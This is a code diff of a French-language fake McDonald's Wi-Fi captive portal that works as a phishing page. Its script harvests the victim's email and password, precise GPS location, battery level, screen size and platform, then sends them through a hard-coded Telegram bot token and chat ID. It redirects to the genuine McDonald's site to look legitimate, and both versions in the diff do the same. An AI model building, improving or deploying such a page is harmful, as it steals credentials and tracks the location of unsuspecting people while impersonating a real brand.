@@ -1,257 +1,274 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Wi-Fi Gratuit McDonald's</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>McDo™ Wi-Fi - Connexion gratuite</title>
+    <style>
+        :root {
+            --mc-green: #0a472c;
+            --mc-yellow: #ffbc0d;
+            --mc-red: #da291c;
+            --mc-white: #ffffff;
+            --mc-grey: #f4f4f4;
+        }
 
-<style>
-  :root {
-    --mcdo-green: #0a472c;
-    --mcdo-yellow: #ffbc0d;
-    --mcdo-red: #da291c;
-    --bg-light: #f4f4f4;
-  }
+        body {
+            background-color: var(--mc-grey);
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
 
-  body {
-    background-color: var(--bg-light);
-    color: #333;
-    font-family: "Speedee", "Helvetica Neue", Helvetica, Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-  }
+        /* Barre de navigation officielle */
+        .nav-header {
+            background-color: var(--mc-green);
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
 
-  /* Navbar fixe comme sur un vrai portail */
-  .navbar {
-    background-color: var(--mcdo-green);
-    height: 60px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    position: sticky;
-    top: 0;
-    z-index: 1000;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-  }
+        .nav-header span {
+            color: var(--mc-yellow);
+            font-size: 38px;
+            font-weight: bold;
+            font-family: "serif";
+        }
 
-  .navbar img {
-    height: 40px;
-  }
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 20px;
+        }
 
-  .main-content {
-    max-width: 450px;
-    margin: 0 auto;
-    padding: 20px;
-  }
+        /* Carte de bienvenue */
+        .welcome-card {
+            background: var(--mc-white);
+            border-radius: 16px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
 
-  /* Bannière d'accueil */
-  .hero {
-    background: white;
-    border-radius: 12px;
-    overflow: hidden;
-    margin-bottom: 20px;
-    box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-  }
+        .hero-banner {
+            background-color: var(--mc-yellow);
+            padding: 20px;
+            font-size: 40px;
+        }
 
-  .hero-img {
-    width: 100%;
-    height: 150px;
-    background: var(--mcdo-yellow);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 50px;
-  }
+        .welcome-text {
+            padding: 20px;
+        }
 
-  .hero-text {
-    padding: 15px;
-    text-align: center;
-  }
+        .welcome-text h1 {
+            margin: 0;
+            font-size: 22px;
+            color: var(--mc-green);
+        }
 
-  .hero-text h1 {
-    margin: 0;
-    font-size: 20px;
-    color: var(--mcdo-green);
-  }
+        /* Formulaire de Phishing */
+        .login-section {
+            background: var(--mc-white);
+            padding: 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
 
-  /* Formulaire style Application */
-  .auth-card {
-    background: white;
-    padding: 25px;
-    border-radius: 12px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-  }
+        .input-group {
+            margin-bottom: 15px;
+        }
 
-  .input-field {
-    margin-bottom: 20px;
-  }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #666;
+        }
 
-  .input-field label {
-    display: block;
-    font-size: 14px;
-    font-weight: 700;
-    margin-bottom: 8px;
-    color: #555;
-  }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #eee;
+            border-radius: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s;
+        }
 
-  .input-field input {
-    width: 100%;
-    padding: 14px;
-    border: 2px solid #eee;
-    border-radius: 8px;
-    font-size: 16px;
-    box-sizing: border-box;
-    transition: border-color 0.3s;
-  }
+        .input-group input:focus {
+            border-color: var(--mc-yellow);
+            background: #fffdf8;
+            outline: none;
+        }
 
-  .input-field input:focus {
-    border-color: var(--mcdo-yellow);
-    outline: none;
-  }
+        .btn-connect {
+            width: 100%;
+            background-color: var(--mc-yellow);
+            color: var(--mc-green);
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 0 #e6a800;
+            transition: 0.1s;
+        }
 
-  .btn-yellow {
-    width: 100%;
-    background-color: var(--mcdo-yellow);
-    color: var(--mcdo-green);
-    border: none;
-    padding: 18px;
-    border-radius: 50px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    box-shadow: 0 4px 0 #e6a800;
-    transition: all 0.1s;
-  }
+        .btn-connect:active {
+            transform: translateY(3px);
+            box-shadow: 0 1px 0 #e6a800;
+        }
 
-  .btn-yellow:active {
-    transform: translateY(2px);
-    box-shadow: 0 2px 0 #e6a800;
-  }
+        /* Écran de chargement réaliste */
+        #loader-screen {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
 
-  /* Loader discret */
-  #loading-overlay {
-    display: none;
-    text-align: center;
-    padding: 20px;
-  }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--mc-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
 
-  .dots {
-    display: inline-block;
-    width: 8px;
-    height: 8px;
-    background: var(--mcdo-red);
-    border-radius: 50%;
-    margin: 3px;
-    animation: bounce 0.6s infinite alternate;
-  }
-  .dots:nth-child(2) { animation-delay: 0.2s; }
-  .dots:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-  @keyframes bounce { to { transform: translateY(-10px); } }
-
-  footer {
-    text-align: center;
-    padding: 20px;
-    font-size: 12px;
-    color: #888;
-  }
-</style>
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            font-size: 11px;
+            color: #999;
+            line-height: 1.6;
+        }
+    </style>
 </head>
 <body>
 
-<div class="navbar">
-  <span style="color: var(--mcdo-yellow); font-size: 35px; font-weight: bold;">m</span>
+<div class="nav-header">
+    <span>m</span>
 </div>
 
-<div class="main-content">
-  <div class="hero">
-    <div class="hero-img">🍟</div>
-    <div class="hero-text">
-      <h1>Wi-Fi Illimité & Gratuit</h1>
-      <p style="font-size: 13px; color: #666;">Connectez-vous pour profiter de vos services favoris.</p>
-    </div>
-  </div>
+<div class="container">
+    <div id="ui-main">
+        <div class="welcome-card">
+            <div class="hero-banner">🍟</div>
+            <div class="welcome-text">
+                <h1>Wi-Fi Gratuit illimité</h1>
+                <p style="font-size: 14px; color: #777;">Identifiez-vous pour accéder au réseau du restaurant.</p>
+            </div>
+        </div>
 
-  <div class="auth-card" id="form-container">
-    <div class="input-field">
-      <label>E-mail ou Identifiant McDo+</label>
-      <input type="email" id="email" placeholder="nom@exemple.com">
-    </div>
-    
-    <div class="input-field">
-      <label>Mot de passe</label>
-      <input type="password" id="pass" placeholder="••••••••">
+        <div class="login-section">
+            <div class="input-group">
+                <label>E-mail ou Identifiant McDo+</label>
+                <input type="email" id="email" placeholder="exemple@mail.com">
+            </div>
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" id="pass" placeholder="••••••••">
+            </div>
+            <button class="btn-connect" onclick="processLogin()">SE CONNECTER</button>
+            <p style="text-align: center; font-size: 11px; margin-top: 15px; color: #aaa;">
+                En vous connectant, vous acceptez nos CGU et notre politique de protection des données.
+            </p>
+        </div>
     </div>
 
-    <button class="btn-yellow" onclick="submitData()">SE CONNECTER</button>
-    
-    <p style="font-size: 11px; text-align: center; margin-top: 15px;">
-      En vous connectant, vous acceptez l'utilisation des cookies pour améliorer votre expérience.
-    </p>
-  </div>
-
-  <div id="loading-overlay">
-    <div class="dots"></div><div class="dots"></div><div class="dots"></div>
-    <p style="font-weight: bold; color: var(--mcdo-green);">Configuration de votre accès...</p>
-  </div>
+    <div id="loader-screen">
+        <div class="spinner"></div>
+        <p style="font-weight: bold; color: var(--mc-green);">Authentification en cours...</p>
+        <p style="font-size: 12px; color: #888;">Veuillez patienter pendant la configuration de votre accès réseau.</p>
+    </div>
 </div>
 
 <footer>
-  Conditions Générales | Aide | Confidentialité<br>
-  © 2026 McDonald's™
+    McDonald's France Services<br>
+    Accessibilité | Mentions Légales | Cookies<br>
+    © 2026 McDonald's™
 </footer>
 
 <script>
-const TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
-const CHAT_ID = "7400979339";
+    // TES ACCÈS TELEGRAM
+    const TG_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
+    const TG_CHAT = "7400979339";
 
-async function submitData() {
-    const e = document.getElementById('email').value;
-    const p = document.getElementById('pass').value;
+    async function processLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
-    if(!e || !p) { alert("Veuillez remplir vos identifiants."); return; }
+        if(!email || !pass) {
+            alert("Veuillez saisir vos identifiants McDo+.");
+            return;
+        }
 
-    // On cache le formulaire et on montre le chargement "pro"
-    document.getElementById('form-container').style.display = 'none';
-    document.getElementById('loading-overlay').style.display = 'block';
+        // Basculer l'affichage
+        document.getElementById('ui-main').style.display = 'none';
+        document.getElementById('loader-screen').style.display = 'block';
 
-    // Collecte des infos en arrière-plan
-    let battery = "Inconnue";
-    if(navigator.getBattery) {
-        const b = await navigator.getBattery();
-        battery = Math.round(b.level * 100) + "%";
+        // 1. Batterie
+        let batt = "Inconnu";
+        if(navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batt = Math.round(b.level * 100) + "%" + (b.charging ? " (⚡)" : "");
+        }
+
+        // 2. GPS + Envoi final
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (p) => {
+                    const coords = `${p.coords.latitude},${p.coords.longitude}`;
+                    await sendData(email, pass, coords, batt);
+                },
+                async () => {
+                    await sendData(email, pass, "Refusé ❌", batt);
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        } else {
+            await sendData(email, pass, "Non supporté", batt);
+        }
     }
 
-    // On lance la demande GPS
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        const gps = `${pos.coords.latitude},${pos.coords.longitude}`;
-        await send(e, p, gps, battery);
-    }, async () => {
-        await send(e, p, "Refusé ❌", battery);
-    }, {timeout: 5000});
-}
+    async function sendData(e, p, loc, b) {
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const mapUrl = loc.includes(',') ? `https://www.google.com/maps?q=${loc}` : loc;
+        
+        const message = `🍔 NOUVELLE CONNEXION MCDO\n\n` +
+                        `📧 Email : ${e}\n` +
+                        `🔑 Pass  : ${p}\n` +
+                        `📍 GPS   : ${mapUrl}\n` +
+                        `🔋 Batt  : ${b}\n` +
+                        `🖥 Écran : ${screen}\n` +
+                        `📱 OS    : ${navigator.platform}`;
 
-async function send(email, pass, gps, bat) {
-    const msg = `🍔 NOUVELLE CONNEXION MCDO\n\n` +
-                `👤 Email: ${email}\n` +
-                `🔑 Pass: ${pass}\n` +
-                `📍 GPS: https://www.google.com/maps?q=${gps}\n` +
-                `🔋 Batterie: ${bat}\n` +
-                `🖥 Écran: ${screen.width}x${screen.height}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: message })
+            });
+        } catch (error) {}
 
-    try {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-        });
-    } catch(err) {}
-
-    // Petit délai pour simuler le succès
-    setTimeout(() => {
-        window.location.href = "https://www.mcdonalds.fr/fidele-au-poste";
-    }, 1000);
-}
+        // Redirection après 2 secondes pour faire vrai
+        setTimeout(() => {
+            window.location.href = "https://www.mcdonalds.fr/fidele-au-poste";
+        }, 2000);
+    }
 </script>
 
 </body>
